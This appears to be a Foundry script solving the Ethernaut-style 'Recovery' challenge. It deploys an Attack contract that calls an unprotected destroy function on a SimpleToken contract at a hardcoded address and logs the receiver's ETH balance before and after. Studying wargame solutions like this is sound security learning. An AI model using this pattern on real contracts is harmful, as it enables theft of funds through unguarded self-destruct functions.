// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {SimpleToken} from "../src/Recovery.sol";

contract Attack {
    SimpleToken public simpleToken;
    address payable public receiver;

    constructor(address payable _simpleToken, address payable _receiver) {
        simpleToken = SimpleToken(_simpleToken);
        receiver = _receiver;
    }

    function attack() public {
        simpleToken.destroy(receiver);
    }
}

contract RecoveryAttackScript is Script {
    address payable private constant SIMPLE_TOKEN_ADDRESS = payable(0x3eEe25f2787DeD5Bd6CDa3264e217bA1865A280c);
    address payable private constant RECEIVER = payable(0x8fe205351ADE3b32245FFcBa2F58141Fa3B0a20F);

    function run() public {
        vm.startBroadcast();

        console.log("Before ETH balance:", RECEIVER.balance);

        Attack attacker = new Attack(SIMPLE_TOKEN_ADDRESS, RECEIVER);
        attacker.attack();

        console.log("After ETH balance:", RECEIVER.balance);

        vm.stopBroadcast();
    }
}
